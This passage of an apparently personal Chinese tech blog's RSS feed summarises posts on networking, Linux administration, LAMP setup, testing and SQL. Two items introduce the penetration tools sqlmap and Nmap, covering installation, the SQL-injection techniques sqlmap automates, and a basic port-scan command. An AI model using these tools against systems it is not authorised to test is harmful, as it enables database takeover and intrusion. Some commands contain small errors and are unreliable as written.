      <guid>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C2%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/</guid>
      <description>1.为什么要划分子网  如果不划分子网，那么每个路由器中路由表的信息量将会非常大，影响网络的速度与性能。划分子网后，将减少广播所带来的负面影响，提高整体的性能。 相对来看，节省了 IP 地址资源，在分配地址时，不再按类地址进行分配，而是按需分配，所以总的来说，被浪费的 IP 地址少了，IP 地址资源节省了。 虽然划分子网没有增加可用 IP 地址，而且减少了可用 IP 地址（因为每个子网中的全 0 网络地址和全 1 广播地址均不能作为主机 IP 来使用）。但通过对一个网络进行子网划分，将一个大网络分成多个小的网络的操作，可以让更多的人拥有 IP 地址。比如，当一组 IP 地址指定给一个公司时，公司可以将该网络分割成多个小网络，分配给每个部门使用。这样，技术部门和管理部门就都可以有属于自己的小网络。  2.什么是子网掩码 子网掩码是判断两个 IP 地址是否同属一个子网的标志，同时也是一个 32 位二进制地址，它和 IP 地址一样也是使用点式十进制来表示的。如果两个 IP 地址在和子网掩码的按位与计算下所得结果相同，即表明它们共属于同一子网中。
每个子网有 3 类地址：网络地址，主机分配地址，广播地址。如子网 192.168.1.0 — 192.168.1.63。其网络地址 192.168.1.0，广播地址 192.168.1.63，主机分配地址 192.168.1.1 — 192.168.1.62。
3.从故事解释子网掩码 有这样一个故事：从前有一个地主，有着 256 间房子，他家的门牌号码是 192.168.1，第一间房子的门牌号码是 192.168.1.0，第二间是192.168.1.1，以此类推第 256 间的编号是 192.168.1.255 。
某天，地主老了，需要把 256 间房子平均分给 4 个儿子，每个儿子可以分 64 间，于是请来一位先生主持公道。先生这么来操作。
 192.168.1.0 - 192.168.1.63 分给大儿子 192.168.1.64 - 192.</description>
    </item>
    
    <item>
      <title>Linux(6)——LAMP 环境安装与使用</title>
      <link>https://ac-lm.github.io/posts/linux/linux6lamp-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux6lamp-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</guid>
      <description>1.什么是LAMP环境 LAMP是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写：
 Linux，操作系统 Apache，网页服务器 MariaDB或MySQL，数据库管理系统（或者数据库服务器） PHP、Perl或Python，脚本语言  2.MariaDB 数据库 yum -y mariadb mariadb-server #安装mariadb客户端和服务端程序 yum groupinstall mariadb mariadb-server -y #或 systemctl start mariadb #启动程序 systemctl enable mariadb #设为开机自启动 mysql_secure_installation #直接执行初始化命令，会弹出交互配置信息 ##交互信息## Enter current password for root (enter for none):#初次进入密码为空，直接回车 New password: #输入要为root用户设置的数据库密码。 Re-enter new password: #重复再输入一次密码。 Remove anonymous users? [Y/n] y #删除匿名帐号 Disallow root login remotely? [Y/n] n #是否禁止root用户从远程登录，安全起见应禁止，这里为做实验方便这里不禁止。 Remove test database and access to it? [Y/n] y #是否删除test数据库，想留着也随意 Reload privilege tables now?</description>
    </item>
    
    <item>
      <title>Net(3)——sqlmap数据库渗透测试工具</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net3sqlmap-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net3sqlmap-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
      <description>1.sqlmap sqlmap官网下载 
sqlmap是一个开源的数据库渗透测试工具，它自动化了检测和利用SQL注入缺陷以及接管数据库服务器的过程。它配备了强大的引擎，为渗透测试提供许多基本的功能。
#进入sqlmap源码文件夹，因为sqlmap用的是python2编写的，需要编译后使用 tar zxvf sqlmap.tar.gz cd sqlmap ./sqlmap.py #创建sqlmap命令 ln -s /root/sqlmapproject-sqlmap-7eab1bc/sqlmap.py /usr/bin/sqlmap sqlmap -h #帮助命令 2.sqlmap的语法 sqlmap命令选项被归类为目标（Target）、请求（Request）、优化、注入、检测、技巧（Techniques）、指纹、枚举等。当给sqlmap一个url的时候，它会执行如下操作
 判断可注入的参数 判断可以用那种SQL注入技术来注入 识别出哪种数据库 根据用户选择，读取哪些数据  3.sqlmap支持的数据库 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase 和 SAP MaxDB
4.sqlmap支持五种不同的注入模式测试  基于布尔的盲注，即可以根据返回页面判断条件真假的注入 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中 联合查询注入，可以使用union的情况下的注入 堆查询注入，可以同时执行多条语句的执行时的注入  5.sqlmap帮助文档翻译 ___ __H__ ___ ___[.]_____ ___ ___ {1.1.3#stable} |_ -| . [(] | .&amp;#39;| . | |___|_ [&amp;#34;]_|_|_|__,| _| |_|V |_| http://sqlmap.</description>
    </item>
    
    <item>
      <title>计算机网络(1)——什么是 IP</title>
      <link>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C1%E4%BB%80%E4%B9%88%E6%98%AF-ip/</link>
      <pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C1%E4%BB%80%E4%B9%88%E6%98%AF-ip/</guid>
      <description>1.IP的分类 Internet 上的每台主机和路由器都有一个由网络号和主机号唯一组成的 IP 地址，而且任意两台机器的 IP 地址互不相同。所有的 IP 地址都是一个 32 位长的二进制数，根据网络号和主机号分组方式的不同，细分为 A、B、C、D、E 五类。
1）A类地址  第一位总是 0，8 位分配给网络号，24 位分配给主机号 地址范围为：0.0.0.0 ~ 127.255.255.255 二进制 32 位：0000-0000.0000-0000.0000-0000.0000-0000 ~ 0111-1111.1111-1111.1111-1111.1111-1111  2）B类地址  前两位总是 10，16 位分配给网络号，16 位分配给主机号 地址范围是：128.0.0.0 ~ 191.255.255.255 网络号：1000 0000.0000-0000 ~ 1011-1111.1111-1111  3）C类地址  前三位总是 110，24 位分配给网络号，8 位分配给主机号 地址范围是：192.0.0.0 ~ 223.255.255.255  4）D类地址  前四位总是 1110，D 类地址作为组播地址（一对多的通信） 地址范围是 224.0.0.0 ~ 239.255.255.255  5）E类地址  前五位总是 11110，E 类地址为保留地址，供以后使用 地址范围是 240.0.0.0 ~ 255.</description>
    </item>
    
    <item>
      <title>Linux(5)——常用快捷键</title>
      <link>https://ac-lm.github.io/posts/linux/linux5%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</link>
      <pubDate>Tue, 17 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux5%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</guid>
      <description>快捷键  Tab ：实现自动补全参数（双击列出全部可能参数） Ctrl-R：搜索命令行历史记录（按下按键之后，输入关键字搜索，重复按下会向后查找匹配项，按下 Enter 会执行当前匹配的命令，而按下右方向键会将匹配项放入当前行中，不会直接执行，以便做出修改） Ctrl-W ：剪切，删除光标前的一个单词 Ctrl-U和Ctrl-K ：剪切，U删除光标前的所有字符，K光标后的所有字符 Ctrl-Y：粘贴Ctrl-W、Ctrl-U和Ctrl-K删除的字符 Alt-B 和 Alt-F ：以单词为单位移动光标，B向前，F向后 Ctrl-A 和Ctrl-E：A将光标移至行首， B将光标移至行尾 Ctrl-L ：清屏 Ctrl-C：中断终端正在执行的任务并开启一个新的一行 Ctrl-Z：暂停在终端运行的任务，使用fg命令可以使暂停恢复 Ctrl+D：退出，如果是切换过来的用户，则执行这个命令回退到原用户 Ctrl+S：锁定终端，使之任何人无法输入 Ctrl+Q：解锁Ctrl+S的锁定状态 !! ：执行上一条命令 !pw：执行以pw开头的命令，这里的pw可以换成任何已经执行过的字符 !pw:p：打印以pw开头的命令，但不执行  </description>
    </item>
    
    <item>
      <title>Net(2)——Nmap端口扫描工具</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net2nmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Tue, 17 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net2nmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</guid>
      <description>1.Nmap Nmap中文网下载 
Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。
# 安装依赖 gcc -v #需要c语言编译  yum install gcc #安装编译器 yum install gcc-c++ # 安装需要c++ ----------------------------------------------------------- #下载源码后解压，进入文件夹编译 tar jxvf Nmap.tar.bz2 cd Nmap.tar.bz2 ./configure make &amp;amp;&amp;amp; make install #安装 nmap ip #扫描端口 nmap -v #如果出现nmap命令无法找到的错误 #尝试进入nmap文件内，使用./nmap ip运行程序 </description>
    </item>
    
    <item>
      <title>Linux(4)——输出到空文件</title>
      <link>https://ac-lm.github.io/posts/linux/linux4%E8%BE%93%E5%87%BA%E5%88%B0%E7%A9%BA%E6%96%87%E4%BB%B6/</link>
      <pubDate>Mon, 16 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux4%E8%BE%93%E5%87%BA%E5%88%B0%E7%A9%BA%E6%96%87%E4%BB%B6/</guid>
      <description>1.文件 /dev/null 代表空设备文件，垃圾箱一类的文件，类似于文件 /dev/zero（这个文件只会输出0）
2.语句 1 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 的含义 在shell中，每个进程都和三个系统文件相关联：标准输入stdin，标准输出stdout、标准错误stderr，三个系统文件的文件描述符分别为0，1，2
 1 &amp;gt; /dev/null ： 表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。 2&amp;gt;&amp;amp;1 ：表示标准错误输出重定向到（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 &amp;gt; ：代表重定向到哪里，例如：echo &amp;ldquo;123&amp;rdquo; &amp;gt; /home/123.txt 1 ：表示 stdout 标准输出，系统默认值是1，所以&amp;quot;&amp;gt;/dev/null&amp;quot;等同于&amp;quot;1&amp;gt;/dev/null&amp;quot; 2 ：表示 stderr 标准错误 &amp;amp; ：表示等同于的意思，2&amp;gt;&amp;amp;1，表示2的输出重定向等同于1  3.实例分析  1 &amp;gt;a 2&amp;gt;a ：stdout和stderr都直接送往文件 a ，a文件会被打开两遍，由此导致stdout和stderr互相覆盖，两者互相竞争使用文件 a 的管道 1 &amp;gt;a 2&amp;gt;&amp;amp;1 ：stdout直接送往文件a ，stderr是继承了stdout的管道之后，再被送往文件a 。a文件只被打开一遍，就是stdout将其打开。只使用了一个管道stdout，但已经包括了stdout和stderr。从IO效率上来讲，1 &amp;gt;a 2&amp;gt;&amp;amp;1的效率更高。  $ cat test.sh #test.sh中包含两个命令（t, date），其中t是一个不存在的命令，执行会报错，默认情况下，错误会输出到stderr。date则能正确执行，并且输出时间信息，默认输出到stdout ./test.sh &amp;gt; test1.log #./test.sh: line 1: t: command not found $ cat test1.</description>
    </item>
    
    <item>
      <title>Net(1)——iperf 与 netperf 网络性能测量工具</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net1iperf-%E4%B8%8E-netperf-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%B5%8B%E9%87%8F%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Sun, 15 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net1iperf-%E4%B8%8E-netperf-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%B5%8B%E9%87%8F%E5%B7%A5%E5%85%B7/</guid>
      <description>1.iperf iperf 官网下载 
iPerf 是一种网络性能测试工具，能对协议、定时、缓冲区等参数进行配置调整，能够测试TCP/UDP最大带宽、延迟抖动、数据包丢失等信息。
iPerf基于Server/Client的工作模式，客户端向服务端发送一定数量的数据，服务端统计并记录带宽、延时抖动等信息。客户端将数据全部发送后，服务端会回复一个数据包给客户端，将测试数据反馈给客户端。不过，如果网络较为拥塞或者误码率较高，客户端无法收到服务端回复的数据包，则只能显示本地记录的部分测试结果，所以服务端和客户端的测试结果可能有所不同。
# 安装 rpm -ivh xxxx.rpm # iPerf命令语法格式 iperf [-s|-c host] [options] iperf3 -s # 服务器 iperf3 -c ServerIP # 客户机 # 配置软链接 cd /usr/bin ln -s iperf3 iperf 2.netperf netperf 官网下载 
Netperf是一种网络性能测量工具，主要用于测试TCP或UDP和Berkeley套接字接口的批量数据传输（bulk data transfer）和请求/应答（request/reponse）性能。
Netperf工具以Client/Server方式工作，服务端是netServer，用来侦听来自客户端的连接，客户端是netperf，用来向服务发起网络测试。在客户端与服务端之间，首先建立一个控制连接，传递有关测试配置的信息，以及测试的结果。在控制连接建立并传递了测试配置信息以后，客户端与服务端之间会再建立一个测试连接，用于来回传递特殊的流量，以测试网络的性能。当netServer在服务端启动后，就可在客户端运行netperf来测试网络的性能。
rpm -ivh xxxx.rpm netperf -V # 安装完以后，会生成两个工具：netserver 和 netperf netserver -D -p 9991 # 服务器，-D 前台运行，-p 指定端口 netperf -H host # 客户端 3.网络性能指标  网络吞吐量：单位时间内通过某个网络（信道或接口）的数据量，吞吐量受网络的带宽或者网络的额定速率限制，单位通常表示为bit/s或bps。 网络延时：一个数据包从用户的计算机发送到网站服务器，然后再立即从网站服务器返回用户计算机的来回时间。影响网络延时的主要因素是路由的跳数和网络的流量。交换机延时（Latency）是指从交换机接收到数据包到开始向目的端口复制数据包之间的时间间隔。有许多因素会影响交换机延时大小，比如转发技术等等。 抖动：用于描述包在网络中的传输延时的变化，抖动越小，说明网络质量越稳定越好。抖动是评价一个网络性能的最重要的因素。 丢包率：理想状态下是发送了多少数据包就能接收到多少数据包，但是由于信号衰减、网络质量等诸多因素的影响并不能达到理想状态，而丢包率就是指测试中所丢失的数据包数量占所发送的数据包的比率。  4.</description>
    </item>
    
    <item>
      <title>Web开发(1)——War 文件</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%911war-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Fri, 30 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%911war-%E6%96%87%E4%BB%B6/</guid>
      <description>1.War 文件 War包一般是在进行Web开发时，一个网站Project下的所有源码的集合，里面包含前台HTML/CSS/JS/JSP等的代码，也包含编译Java的代码。当开发人员在自己的开发机器上调试所有代码并通过后，为了交给测试人员测试和未来进行产品发布，都需要将开发人员的源码打包成War进行发布。
War包可以放在Tomcat下的webapps或者word目录下，随着tomcat服务器的启动，它可以自动被解压。
2.扩展 | Jar、war、EAR 的区别 Jar、war、EAR、在文件结构上，三者并没有什么不同，它们都采用zip或jar档案文件压缩格式。但是它们的使用目的有所区别：
 Jar文件（扩展名为. Jar，Java Application Archive）包含Java类的普通库、资源（resources）、辅助文件（auxiliary files）等。通常是开发时要引用的通用类，打成包便于存放管理。简单来说，jar包就是别人已经写好的一些类，然后对这些类进行打包。可以将这些jar包引入到你的项目中，可以直接使用这些jar包中的类和属性，这些jar包一般放在lib目录下。 War文件（扩展名为.War,Web Application Archive）包含全部Web应用程序。在这种情形下，一个Web应用程序被定义为单独的一组文件、类和资源，用户可以对jar文件进行封装，并把它作为小型服务程序（servlet）来访问。 war包是一个可以直接运行的web模块，通常用于网站，打成包部署到容器中。以Tomcat来说，将war包放置在其\webapps\目录下,然后启动Tomcat，这个包就会自动解压，就相当于发布了。war包是Sun提出的一种web应用程序格式，与jar类似，是很多文件的压缩包。war包中的文件按照一定目录结构来组织。根据其根目录下包含有html和jsp文件，或者包含有这两种文件的目录，另外还有WEB-INF目录。通常在WEB-INF目录下含有一个web.xml文件和一个classes目录，web.xml是这个应用的配置文件，而classes目录下则包含编译好的servlet类和jsp，或者servlet所依赖的其他类（如JavaBean）。通常这些所依赖的类也可以打包成jar包放在WEB-INF下的lib目录下。 Ear文件（扩展名为.Ear,Enterprise Application Archive）包含全部企业应用程序。在这种情形下，一个企业应用程序被定义为多个jar文件、资源、类和Web应用程序的集合。  </description>
    </item>
    
    <item>
      <title>随记(13)——测试用例的设计</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B013%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9A%84%E8%AE%BE%E8%AE%A1/</link>
      <pubDate>Fri, 30 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B013%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9A%84%E8%AE%BE%E8%AE%A1/</guid>
      <description>1.什么是测试用例   设计一个情况，软件程序在这种情况下，必须能够正常运行并且达到程序所设计的预期结果。（即把程序可能发生的每种情况列出来）
  如果程序在这种情况下不能正常运行，而且这种问题会重复发生，那就表示软件程序测试人员已经测出软件有缺陷，这时候就必须将这个问题标识出来，并且通知软件开发人员。软件开发人员接获通知后，将这个问题修改完成于下一个测试版本内。
  软件测试工程师取得新的测试版本后，必须利用同一个用例来测试这个问题，确保该问题已修改完成。
  2.用例设计方法 a.等价类 解释：依据需求将输入划分为若干个等价类,从等价类中选出一个测试用例,如果这个测试用例测试通过,则认为所代表的整个等价类测试通过,这样就可以通过较少的测试用例达到尽量多的功能覆盖,解决了不能穷举测试的问题
弊端：等价类只考虑输入域的分类,没有考虑输入域的组合,需要其他的设计方法和补充
 有效等价类:对于程序的规格说明书是合理的,有意义的输入数据构成的集合,利用有效等价类验证程序是否实现了规格说明书中所规定的功能和性能 无效等价类:根据需求说明书,不满足需求的集合  超市买水果有效等价类:苹果,香蕉,桃子...无效等价类:青菜,大米,饮料... b.边界值 解释：边界值分析法就是对输入或者输出的边界值进行测试的一种黑盒测试方法，通常边界值分析法是作为对等价类划分方法的补充,这种情况下,其测试用例来自等价类的边界
输入框长度为1-11,边界值取值:0,1,11,12运动员参赛项目为1-3项,边界值取值:0项,1项,3项,4项查询面页面有999行,每50行为一页,边界值取值:0行,1行,50行,51行,999行 c.因果图 解释：因果图是一种简化了的逻辑图,能直观的表明程序输入条件(原因)和输出动作(结果)之间的相互关系,因果图法是借助图形来设计测试用例的一种系统方法,特别适用于被测试程序具有多种输入条件,程序的输出又依赖于输入条件的各种情况
因果图设计测试用例的步骤:
 分析所有可能的输入和可能的输出 找出输入与输出之间的关系 画出因果图 把因果图转化成判定表 把判定表对应到每一个测试用例  案例：
淘宝在双十一退出打折优惠活动,订单已提交,订单金额大于300或有红包,则优惠1.对于这条业务规则,首先通过分析所有可能的输入和可能的输出,可以得到如下结果:
 输入:订单已提交,订单金额大于300,有红包 输出:优惠,不优惠  2.然后进行第二步,找出输入域输出之间的关系,通过分析得出以下对应关系
 订单已提交,订单金额大于300,则优惠 订单已提交,订单金额小于等于300,无红包,不优惠 订单已提交,订单金额小于等于300,有红包,优惠 订单已提交,有红包,优惠 订单未提交,不优惠  3.为了方便画出因果图和判定图,对所有输入和输出编号,编号如下:
 1:订单已提交 2:订单金额大于300 3:有红包 21:优惠 22:不优惠  4.画因果图，画判定表，得测试用例
d.正交排列 解释：正交法的目的是为了减少用例数量,用尽量少的用例,覆盖输入的两两组合，正交试验设计是研究多因素多水平的一种设计方法,它是根据正交性,由实验因素的全部水平组合中挑选出部分有代表性的点进行实验,通过对这部分实验结果的分析了解全面试验的情况,找出最优的水平组合,正交试验设计是一种基于正交表的,高效率,快速,经济的试验.
正交排列需要掌握的基本知识:因素(Factor):在一项试验中,凡是考虑的变量都称为因素(变量)水平/位级(Level):在试验范围内,因素被考查的值称为水平(变量的取值)正交表的构成:- 行数(Runs):正交表中行的个数,即试验的次数,用N表示- 因素数(Factors): 正交表中列的个数,用C表示- 水平数(Levels): 任何单个因素能够取到的值的最大个数,正交表中包含的值为从0到数&amp;quot;水平数-1&amp;quot;或者从1到&amp;quot;水平数&amp;quot;,用T表示正交表的表示形式: L=行数(水平数*因素数) L=N(TC)正交表的两条性质:- 每一列中各数字出现的次数都一样多- 任何两列锁构成的各有序数对出现的次数都一样多正交法设计测试用例的步骤：</description>
    </item>
    
    <item>
      <title>Linux(3)——Java 与 Tomcat 的配置</title>
      <link>https://ac-lm.github.io/posts/linux/linux3java-%E4%B8%8E-tomcat-%E7%9A%84%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Thu, 22 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux3java-%E4%B8%8E-tomcat-%E7%9A%84%E9%85%8D%E7%BD%AE/</guid>
      <description>1.Java 配置 # 查看内核 arch uname -a JDK 官网下载  注意跟随内核版本，ARM下ARM，x86下x86，下载源码
# 删除自带的openjava rpm -qa | grep java yum -y remove openjava # 配置环境变量 vim /etc/profile #编辑vi # 添加以下内容 # This is Java: JAVA_HOME=/home/ams/jdk PATH=$PATH:${JAVA_HOME}/bin export JAVA_HOME PATH source /etc/profile #启用环境 配置后启动环境，若配置环境后无法使用Java，需运行此命令 Java -version 2.Tomcat 配置 Tomcat 官网下载  注意跟随内核版本，下载源码
# 环境变量 # 建议定义在单个tomcat的启动和关闭程序，避免影响 # 打开startup.sh和shutdown.sh，添加以下内容 export TOMCAT_HOME=/home/ams/tomcat export CATALINA_HOME=/home/ams/tomcat export PATH=$PATH:/home/ams/tomcat/bin #-------------------------------------- /bin/bash startup.sh #运行tomcat ps -ef | grep tomcat #是否安装tomcat root 3905 13.</description>
    </item>
    
    <item>
      <title>Linux(2)——Docker 与防火墙</title>
      <link>https://ac-lm.github.io/posts/linux/linux2docker-%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/</link>
      <pubDate>Fri, 16 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux2docker-%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99/</guid>
      <description>1.docker操作 lsb_release -a #查看版本信息，需安装 uname -r #查看内核信息 yum list installed | grep docker #查找docker是否安装 yum -y install docker #下载安装docker systemctl start docker #运行docker systemctl status docker #查看docker状态 systemctl enable docker #自启动docker docker version #docker版本 docker ps -a #查看docker安装的服务 docker start services #docker运行服务 docker rm -f name #强制删除 docker exec service_ip ping #联网查看 docker exec -it id /bin/bash #进入容器  docker rename gallant_swartz python3.9 #重命名 docker images docker rmi image docker export a9ad7f0cb1ad &amp;gt; $(pwd)/itestserver.</description>
    </item>
    
    <item>
      <title>Linux(1)——Linux 系统文件</title>
      <link>https://ac-lm.github.io/posts/linux/linux1linux-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 15 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux1linux-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6/</guid>
      <description>&amp;mdash;&amp;mdash;&amp;ndash; 基于发行版本 CentOS-7 &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;
1.Linux的镜像分类  CentOS-7.0-x86_64-DVD-1503-01.iso : 标准安装版 CentOS-7.0-x86_64-NetInstall-1503-01.iso : 网络安装镜像 CentOS-7.0-x86_64-Everything-1503-01.iso: 对完整版安装盘的软件进行补充，集成所有软件 CentOS-7.0-x86_64-GnomeLive-1503-01.iso: GNOME 桌面版 CentOS-7.0-x86_64-KdeLive-1503-01.iso: KDE 桌面版 CentOS-7.0-x86_64-livecd-1503-01.iso : 光盘上运行的系统，类拟于 WindowsPE CentOS-7.0-x86_64-minimal-1503-01.iso : 精简版，自带的软件最少  2.Linux系统目录  /bin：bin 是 Binaries（二进制文件）的缩写，这个目录存放着最经常使用的命令。 /boot：这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev：dev 是 Device（设备）的缩写，该目录存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。 /etc：etc 是 Etcetera 这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home：用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的 /lib：lib 是 Library（库）的缩写，这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media：linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。 /mnt：系统提供给用户临时挂载别的文件系统的目录，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录查看光驱里的内容 /opt：opt 是 optional（可选）的缩写，这是给主机额外安装软件所摆放的目录。默认是空的。 /proc：proc 是 Processes（进程）的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，目的管理内存空间！ /root：该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin：是 Superuser Binaries（超级用户的二进制文件）的缩写，这里存放的是系统管理员使用的系统管理程序。 /selinux：这个目录是 Redhat / CentOS 所特有的目录，selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放 selinux 相关的文件的。 /srv：该目录存放一些服务启动之后需要提取的数据。 /sys：sys 文件系统集成了下面 3 种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp：tmp 是 temporary（临时）的缩写，这个目录是用来存放一些临时文件的。 /usr：usr 是 unix shared resources（共享资源）的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。 /usr/bin：系统用户使用的应用程序。 /usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src：内核源代码默认的放置目录。 /var：var 是 variable（变量）的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的文件放在这个目录下。包括各种日志文件。 /run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。  避免修改  /etc：配置目录。 /var：日志目录。 /bin，/sbin，/usr/bin，/usr/sbin：这是系统预设的执行文件的放置目录，比如 ls 就是在 /bin/ls 目录下的。  </description>
    </item>
    
    <item>
      <title>SQL(4)——事务</title>
      <link>https://ac-lm.github.io/posts/sql/sql4%E4%BA%8B%E5%8A%A1/</link>
      <pubDate>Wed, 30 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/sql/sql4%E4%BA%8B%E5%8A%A1/</guid>
      <description>参考原文：SQL教程 @廖雪峰 
 1.事务 在执行SQL语句的时候，某些业务要求，一系列操作必须全部执行，而不能仅执行一部分。例如，一个转账操作：
-- 从id=1的账户给id=2的账户转账100元 -- 第一步：将id=1的A账户余额减去100 UPDATE accounts SET balance = balance - 100 WHERE id = 1; -- 第二步：将id=2的B账户余额加上100 UPDATE accounts SET balance = balance + 100 WHERE id = 2; 这两条SQL语句必须全部执行，或者，由于某些原因，如果第一条语句成功，第二条语句失败，就必须全部撤销。
这种把多条语句作为一个整体进行操作的功能，被称为数据库事务。数据库事务可以确保该事务范围内的所有操作都可以全部成功或者全部失败。如果事务失败，那么效果就和没有执行这些SQL一样，不会对数据库数据有任何改动。
可见，数据库事务具有ACID这4个特性：
